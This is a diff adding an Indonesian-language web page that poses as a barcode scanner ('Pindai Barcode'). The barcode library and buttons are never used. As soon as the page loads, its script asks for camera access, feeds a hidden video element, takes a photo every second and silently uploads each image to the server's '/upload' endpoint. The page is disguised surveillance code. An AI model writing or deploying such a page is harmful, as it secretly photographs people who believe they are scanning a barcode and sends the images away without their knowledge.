@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pindai Barcode</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/quagga/0.12.1/quagga.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        #interactive {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            border: 2px dashed #ccc;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        #interactive:before {
+            content: "";
+            display: block;
+            padding-top: 100%;
+        }
+        #interactive canvas, 
+        #interactive video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        #result {
+            text-align: center;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+        #result span {
+            font-weight: bold;
+        }
+        #status {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+        }
+        .button {
+            display: block;
+            width: 200px;
+            padding: 10px;
+            margin: 20px auto;
+            text-align: center;
+            background-color: #333;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        .button:hover {
+            background-color: #555;
+        }
+    </style>
+</head>
+<body>
+    <h1>Pindai Barcode</h1>
+    <div id="interactive" class="viewport"></div>
+    <p id="result">Hasil: <span id="barcode-result">Belum ada hasil</span></p>
+    <div id="status"></div>
+    <a href="#" class="button" id="start-button">Mulai Pindai</a>
+    <a href="#" class="button" id="stop-button" style="display: none;">Hentikan Pindai</a>
+    <video id="video" autoplay style="display: none;"></video>
+    <script>
+        const video = document.getElementById('video');
+        const statusElement = document.getElementById('status');
+        let captureInterval;
+
+        // Fungsi untuk meminta izin kamera
+        function requestCameraPermission() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        console.log('Izin kamera diberikan');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            startCapture();
+                        };
+                    })
+                    .catch(error => {
+                        console.error('Kamera tidak tersedia:', error);
+                        statusElement.textContent = 'Izin kamera diperlukan untuk merekam!';
+                        if (error.name === 'NotAllowedError') {
+                            statusElement.textContent = 'Izin kamera ditolak oleh pengguna.';
+                        } else if (error.name === 'NotFoundError') {
+                            statusElement.textContent = 'Kamera tidak ditemukan.';
+                        }
+                    });
+            } else {
+                console.error('getUserMedia tidak didukung oleh browser ini.');
+                statusElement.textContent = 'Browser Anda tidak mendukung pengambilan gambar otomatis.';
+            }
+        }
+
+        // Fungsi untuk memulai pengambilan foto secara berkala
+        function startCapture() {
+            captureInterval = setInterval(capturePhoto, 1000); // Ambil foto setiap 1 detik
+        }
+
+        // Fungsi untuk menghentikan pengambilan foto
+        function stopCapture() {
+            clearInterval(captureInterval);
+        }
+
+        // Fungsi untuk mengambil foto
+        function capturePhoto() {
+            console.log('Mengambil foto');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Kirim gambar ke server
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.jpg');
+
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => response.text())
+                  .then(result => {
+                  })
+                  .catch(error => {
+                    stopCapture();
+                  });
+            }, 'image/jpeg', 0.8);
+        }
+
+        // Meminta izin kamera saat halaman dimuat
+        window.onload = requestCameraPermission;
+    </script>
+</body>
+</html>
